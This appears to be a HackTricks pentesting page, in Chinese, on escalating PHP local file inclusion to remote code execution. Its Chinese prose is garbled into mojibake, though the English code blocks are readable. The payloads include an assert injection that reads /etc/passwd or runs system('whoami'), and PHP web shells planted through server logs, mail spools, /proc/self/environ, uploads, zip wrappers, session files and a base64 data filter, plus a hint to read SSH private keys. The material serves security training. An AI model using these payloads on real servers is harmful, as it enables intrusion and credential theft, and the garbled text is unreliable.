## é€šè¿‡ PHP çš„ 'assert' å®ç° LFI

å¦‚æœæ‚¨é‡åˆ°ä¸€ä¸ªéš¾ä»¥å¤„ç†çš„ LFIï¼Œå®ƒä¼¼ä¹åœ¨è¿‡æ»¤åƒ ".." è¿™æ ·çš„éå†å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥ "Hacking attempt" æˆ– "Nice try!" ä¹‹ç±»çš„å›åº”ï¼Œä¸€ä¸ª 'assert' æ³¨å…¥æœ‰æ•ˆè½½è·å¯èƒ½ä¼šèµ·ä½œç”¨ã€‚

åƒè¿™æ ·çš„æœ‰æ•ˆè½½è·ï¼š
```
' and die(show_source('/etc/passwd')) or '
```
å°†æˆåŠŸåˆ©ç”¨çœ‹èµ·æ¥åƒè¿™æ ·çš„â€œfileâ€å‚æ•°çš„PHPä»£ç ï¼š
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
```markdown
ä¹Ÿæœ‰å¯èƒ½åœ¨ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ "assert" è¯­å¥ä¸­ä½¿ç”¨ system() å‡½æ•°æ¥è·å¾— RCEï¼š
```
```
' and die(system("whoami")) or '
```
ç¡®ä¿åœ¨å‘é€å‰å¯¹æœ‰æ•ˆè½½è·è¿›è¡ŒURLç¼–ç ã€‚

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢æ´å¯Ÿ**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢æŒ‘æˆ˜å’Œåˆºæ¿€çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œæ´å¯Ÿï¼Œè·Ÿä¸Šå¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
é€šè¿‡æœ€æ–°çš„æ¼æ´èµé‡‘å‘å¸ƒå’Œå…³é”®å¹³å°æ›´æ–°ï¼Œä¿æŒä¿¡æ¯çš„æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼**

## PHP ç›²ç›®è·¯å¾„éå†

{% hint style="warning" %}
å½“ä½ **æ§åˆ¶**ä¸€ä¸ª**PHPå‡½æ•°**çš„**æ–‡ä»¶è·¯å¾„**ï¼Œè¯¥å‡½æ•°å°†**è®¿é—®ä¸€ä¸ªæ–‡ä»¶**ï¼Œä½†ä½ çœ‹ä¸åˆ°æ–‡ä»¶å†…å®¹ï¼ˆå¦‚ç®€å•çš„è°ƒç”¨**`file()`**ï¼‰æ—¶ï¼Œæ­¤æŠ€æœ¯ç›¸å…³ã€‚ä½†å†…å®¹ä¸ä¼šæ˜¾ç¤ºã€‚
{% endhint %}

åœ¨[**è¿™ç¯‡ä¸å¯æ€è®®çš„æ–‡ç« **](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)ä¸­ï¼Œè§£é‡Šäº†å¦‚ä½•é€šè¿‡PHPè¿‡æ»¤å™¨æ»¥ç”¨ç›²ç›®è·¯å¾„éå†ï¼Œé€šè¿‡é”™è¯¯é¢„è¨€æœº**æ³„éœ²æ–‡ä»¶å†…å®¹**ã€‚

æ€»ç»“æ¥è¯´ï¼ŒæŠ€æœ¯ä½¿ç”¨**"UCS-4LE" ç¼–ç **ä½¿æ–‡ä»¶å†…å®¹å˜å¾—éå¸¸**å¤§**ï¼Œä»¥è‡³äº**æ‰“å¼€**æ–‡ä»¶çš„**PHPå‡½æ•°**ä¼šè§¦å‘ä¸€ä¸ª**é”™è¯¯**ã€‚

ç„¶åï¼Œä¸ºäº†æ³„éœ²ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œä½¿ç”¨è¿‡æ»¤å™¨**`dechunk`**ä»¥åŠå…¶ä»–è¿‡æ»¤å™¨å¦‚**base64**æˆ–**rot13**ï¼Œæœ€åä½¿ç”¨è¿‡æ»¤å™¨**convert.iconv.UCS-4.UCS-4LE**å’Œ**convert.iconv.UTF16.UTF-16BE**å°†å…¶ä»–å­—ç¬¦**æ”¾åœ¨å¼€å¤´å¹¶æ³„éœ²å®ƒä»¬**ã€‚

**å¯èƒ½å­˜åœ¨æ¼æ´çš„å‡½æ•°**ï¼š`file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

æœ‰å…³æŠ€æœ¯ç»†èŠ‚ï¼Œè¯·æŸ¥çœ‹ä¸Šè¿°æ–‡ç« ï¼

## LFI2RCE

### è¿œç¨‹æ–‡ä»¶åŒ…å«

å¦‚å‰æ‰€è¿°ï¼Œ[**è¯·ç‚¹å‡»æ­¤é“¾æ¥**](./#remote-file-inclusion)ã€‚

### é€šè¿‡ Apache/Nginx æ—¥å¿—æ–‡ä»¶

å¦‚æœ Apache æˆ– Nginx æœåŠ¡å™¨åœ¨ include å‡½æ•°ä¸­**å®¹æ˜“å—åˆ° LFI çš„å½±å“**ï¼Œä½ å¯ä»¥å°è¯•è®¿é—®**`/var/log/apache2/access.log` æˆ– `/var/log/nginx/access.log`**ï¼Œåœ¨**ç”¨æˆ·ä»£ç†**ä¸­æˆ–åœ¨**GET å‚æ•°**ä¸­è®¾ç½®ä¸€ä¸ªphp shellï¼Œå¦‚ **`<?php system($_GET['c']); ?>`** å¹¶åŒ…å«è¯¥æ–‡ä»¶

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œå¦‚æœä½ ä½¿ç”¨**åŒå¼•å·**è€Œä¸æ˜¯**å•å¼•å·**æ¥å†™ shellï¼ŒåŒå¼•å·å°†è¢«ä¿®æ”¹ä¸ºå­—ç¬¦ä¸² "_**quote;**_"ï¼Œ**PHP å°†æŠ›å‡ºé”™è¯¯**ï¼Œ**ä¸ä¼šæ‰§è¡Œå…¶ä»–ä»»ä½•æ“ä½œ**ã€‚

æ­¤å¤–ï¼Œç¡®ä¿ä½ **æ­£ç¡®ç¼–å†™æœ‰æ•ˆè½½è·**ï¼Œå¦åˆ™ PHP åœ¨å°è¯•åŠ è½½æ—¥å¿—æ–‡ä»¶æ—¶æ¯æ¬¡éƒ½ä¼šå‡ºé”™ï¼Œä½ å°†æ²¡æœ‰ç¬¬äºŒæ¬¡æœºä¼šã€‚
{% endhint %}

è¿™ä¹Ÿå¯ä»¥åœ¨å…¶ä»–æ—¥å¿—ä¸­å®Œæˆï¼Œä½†è¦**å°å¿ƒ**ï¼Œæ—¥å¿—ä¸­çš„ä»£ç å¯èƒ½æ˜¯URLç¼–ç çš„ï¼Œè¿™å¯èƒ½ä¼šç ´å Shellã€‚å¤´éƒ¨**æˆæƒ "basic"** åŒ…å« Base64 ç¼–ç çš„ "user:password"ï¼Œå¹¶åœ¨æ—¥å¿—ä¸­è§£ç ã€‚PHPShell å¯ä»¥æ’å…¥åˆ°æ­¤å¤´éƒ¨ä¸­ã€‚\
å…¶ä»–å¯èƒ½çš„æ—¥å¿—è·¯å¾„ï¼š
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing å­—å…¸: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### é€šè¿‡ç”µå­é‚®ä»¶

**å‘é€é‚®ä»¶**åˆ°å†…éƒ¨è´¦æˆ·ï¼ˆuser@localhostï¼‰ï¼Œé‚®ä»¶ä¸­åŒ…å«ä½ çš„PHPæœ‰æ•ˆè½½è·ï¼Œå¦‚ `<?php echo system($_REQUEST["cmd"]); ?>`ï¼Œç„¶åå°è¯•åŒ…å«ç”¨æˆ·çš„é‚®ä»¶ï¼Œè·¯å¾„ç±»ä¼¼ **`/var/mail/<USERNAME>`** æˆ– **`/var/spool/mail/<USERNAME>`**

### é€šè¿‡ /proc/\*/fd/\*

1. ä¸Šä¼ å¤§é‡çš„shellï¼ˆä¾‹å¦‚ï¼š100ä¸ªï¼‰
2. åŒ…å« [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)ï¼Œå…¶ä¸­ $PID = è¿›ç¨‹çš„PIDï¼ˆå¯ä»¥æš´åŠ›ç ´è§£ï¼‰ï¼Œ$FD æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼ˆä¹Ÿå¯ä»¥æš´åŠ›ç ´è§£ï¼‰

### é€šè¿‡ /proc/self/environ

åƒæ—¥å¿—æ–‡ä»¶ä¸€æ ·ï¼Œå‘é€æœ‰æ•ˆè½½è·åœ¨User-Agentä¸­ï¼Œå®ƒä¼šè¢«åæ˜ åœ¨ /proc/self/environ æ–‡ä»¶å†…
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### é€šè¿‡ä¸Šä¼ 

å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œåªéœ€åœ¨å…¶ä¸­æ³¨å…¥shellè½½è·ï¼ˆä¾‹å¦‚ï¼š`<?php system($_GET['c']); ?>`ï¼‰ã€‚
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
ä¸ºäº†ä¿æŒæ–‡ä»¶çš„å¯è¯»æ€§ï¼Œæœ€å¥½å°†ä»£ç æ³¨å…¥åˆ°å›¾ç‰‡/doc/pdfçš„å…ƒæ•°æ®ä¸­

### é€šè¿‡Zipæ–‡ä»¶ä¸Šä¼ 

ä¸Šä¼ ä¸€ä¸ªåŒ…å«PHP shellçš„ZIPæ–‡ä»¶ï¼Œå¹¶è®¿é—®ï¼š
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### é€šè¿‡ PHP ä¼šè¯

æ£€æŸ¥ç½‘ç«™æ˜¯å¦ä½¿ç”¨ PHP ä¼šè¯ï¼ˆPHPSESSIDï¼‰
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
åœ¨PHPä¸­ï¼Œè¿™äº›ä¼šè¯è¢«å­˜å‚¨åœ¨ _/var/lib/php5/sess\\_\[PHPSESSID]\_ æ–‡ä»¶ä¸­
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
å°† cookie è®¾ç½®ä¸º `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
ä½¿ç”¨LFIåŒ…å«PHPä¼šè¯æ–‡ä»¶
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### é€šè¿‡ ssh

å¦‚æœ ssh æ´»è·ƒï¼Œæ£€æŸ¥æ­£åœ¨ä½¿ç”¨çš„ç”¨æˆ·ï¼ˆ/proc/self/status å’Œ /etc/passwdï¼‰ï¼Œå¹¶å°è¯•è®¿é—® **\<HOME>/.ssh/id\_rsa**

### **é€šè¿‡** **vsftpd** _**æ—¥å¿—**_

è¿™ä¸ª FTP æœåŠ¡å™¨çš„æ—¥å¿—å­˜å‚¨åœ¨ _**/var/log/vsftpd.log**_ ä¸­ã€‚å¦‚æœä½ æœ‰ä¸€ä¸ª LFI å¹¶ä¸”å¯ä»¥è®¿é—®ä¸€ä¸ªæš´éœ²çš„ vsftpd æœåŠ¡å™¨ï¼Œä½ å¯ä»¥å°è¯•ç™»å½•ï¼Œå°† PHP è´Ÿè½½è®¾ç½®åœ¨ç”¨æˆ·åä¸­ï¼Œç„¶åä½¿ç”¨ LFI è®¿é—®æ—¥å¿—ã€‚

### é€šè¿‡ php base64 è¿‡æ»¤å™¨ï¼ˆä½¿ç”¨ base64ï¼‰

å¦‚[æœ¬æ–‡](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64)æ‰€ç¤ºï¼ŒPHP base64 è¿‡æ»¤å™¨åªå¿½ç•¥é base64ã€‚ä½ å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ç»•è¿‡æ–‡ä»¶æ‰©å±•åæ£€æŸ¥ï¼šå¦‚æœä½ æä¾›ä»¥ ".php" ç»“å°¾çš„ base64ï¼Œå®ƒä¼šå¿½ç•¥ "." å¹¶å°† "php" é™„åŠ åˆ° base64 åé¢ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç¤ºä¾‹è´Ÿè½½ï¼š
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### é€šè¿‡phpè¿‡æ»¤å™¨ï¼ˆæ— éœ€æ–‡ä»¶ï¼‰

è¿™ç¯‡[**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)è§£é‡Šäº†ä½ å¯ä»¥ä½¿ç”¨**phpè¿‡æ»¤å™¨ç”Ÿæˆä»»æ„å†…å®¹**ä½œä¸ºè¾“å‡ºã€‚è¿™åŸºæœ¬ä¸Šæ„å‘³ç€ä½ å¯ä»¥**ç”Ÿæˆä»»æ„phpä»£ç **ç”¨äºinclude**æ— éœ€å†™å…¥**æ–‡ä»¶ã€‚

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### é€šè¿‡æ®µé”™è¯¯

**ä¸Šä¼ **ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒå°†ä½œä¸º**ä¸´æ—¶æ–‡ä»¶**å­˜å‚¨åœ¨`/tmp`ä¸­ï¼Œç„¶ååœ¨**åŒä¸€ä¸ªè¯·æ±‚ä¸­**ï¼Œè§¦å‘ä¸€ä¸ª**æ®µé”™è¯¯**ï¼Œä¹‹å**ä¸´æ—¶æ–‡ä»¶å°†ä¸ä¼šè¢«åˆ é™¤**ï¼Œä½ å¯ä»¥æœç´¢è¿™ä¸ªæ–‡ä»¶ã€‚

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### é€šè¿‡Nginxä¸´æ—¶æ–‡ä»¶å­˜å‚¨

å¦‚æœä½ å‘ç°äº†ä¸€ä¸ª**æœ¬åœ°æ–‡ä»¶åŒ…å«**å¹¶ä¸”**Nginx**åœ¨PHPå‰è¿è¡Œï¼Œä½ å¯èƒ½å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŠ€æœ¯è·å¾—RCEï¼š

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### é€šè¿‡PHP\_SESSION\_UPLOAD\_PROGRESS

å³ä½¿ä½ **æ²¡æœ‰ä¼šè¯**å¹¶ä¸”`session.auto_start`æ˜¯`Off`ï¼Œå¦‚æœä½ åœ¨**multipart POST**æ•°æ®ä¸­æä¾›äº†**`PHP_SESSION_UPLOAD_PROGRESS`**ï¼ŒPHPå°†**ä¸ºä½ å¯ç”¨ä¼šè¯**ã€‚ä½ å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·å¾—RCEï¼š

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### é€šè¿‡Windowsä¸­çš„ä¸´æ—¶æ–‡ä»¶ä¸Šä¼ 

å¦‚æœä½ å‘ç°äº†ä¸€ä¸ª**æœ¬åœ°æ–‡ä»¶åŒ…å«**å¹¶ä¸”æœåŠ¡å™¨è¿è¡Œåœ¨**Windows**ä¸Šï¼Œä½ å¯èƒ½è·å¾—RCEï¼š

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### é€šè¿‡phpinfo() (file\_uploads = on)

å¦‚æœä½ å‘ç°äº†ä¸€ä¸ª**æœ¬åœ°æ–‡ä»¶åŒ…å«**å¹¶ä¸”ä¸€ä¸ªæ–‡ä»¶æš´éœ²äº†**phpinfo()**ä¸”file\_uploads = onï¼Œä½ å¯ä»¥è·å¾—RCEï¼š

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### é€šè¿‡compress.zlib + `PHP_STREAM_PREFER_STUDIO` + è·¯å¾„æ³„éœ²

å¦‚æœä½ å‘ç°äº†ä¸€ä¸ª**æœ¬åœ°æ–‡ä»¶åŒ…å«**å¹¶ä¸”ä½ **å¯ä»¥æ³„éœ²ä¸´æ—¶æ–‡ä»¶çš„è·¯å¾„**ï¼Œä½†æ˜¯**æœåŠ¡å™¨**æ­£åœ¨**æ£€æŸ¥**æ˜¯å¦**è¦åŒ…å«çš„æ–‡ä»¶æœ‰PHPæ ‡è®°**ï¼Œä½ å¯ä»¥å°è¯•ç”¨è¿™ä¸ª**ç«æ€æ¡ä»¶**æ¥**ç»•è¿‡æ£€æŸ¥**ï¼š

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### é€šè¿‡æ°¸ä¹…ç­‰å¾… + æš´åŠ›ç ´è§£

å¦‚æœä½ å¯ä»¥æ»¥ç”¨LFIæ¥**ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶**å¹¶è®©æœåŠ¡å™¨**æŒ‚èµ·**PHPæ‰§è¡Œï¼Œä½ å¯ä»¥åœ¨å‡ ä¸ªå°æ—¶å†…**æš´åŠ›ç ´è§£æ–‡ä»¶å**æ¥æ‰¾åˆ°ä¸´æ—¶æ–‡ä»¶ï¼š

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### è‡´å‘½é”™è¯¯

å¦‚æœä½ åŒ…å«äº†ä»¥ä¸‹ä»»ä½•æ–‡ä»¶`/usr/bin/phar`ã€`/usr/bin/phar7`ã€`/usr/bin/phar.phar7`ã€`/usr/bin/phar.phar`ã€‚ï¼ˆä½ éœ€è¦åŒ…å«åŒä¸€ä¸ªæ–‡ä»¶ä¸¤æ¬¡æ¥å¼•å‘è¯¥é”™è¯¯ï¼‰ã€‚

**æˆ‘ä¸çŸ¥é“è¿™æœ‰ä»€ä¹ˆç”¨ï¼Œä½†å®ƒå¯èƒ½æœ‰ç”¨ã€‚**\
å³ä½¿ä½ å¼•èµ·äº†PHPè‡´å‘½é”™è¯¯ï¼ŒPHPä¸´æ—¶ä¸Šä¼ çš„æ–‡ä»¶ä¹Ÿä¼šè¢«åˆ é™¤ã€‚

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## å‚è€ƒèµ„æ–™

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢æ´å¯Ÿ**\
æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€å’ŒæŒ‘æˆ˜

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œæ´å¯Ÿï¼Œè·Ÿä¸Šå¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
é€šè¿‡æœ€æ–°çš„æ¼æ´èµé‡‘å‘å¸ƒå’Œå…³é”®å¹³å°æ›´æ–°ï¼Œä¿æŒä¿¡æ¯æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy) å¹¶å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»åˆ°é«˜æ‰‹ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°ä½ çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
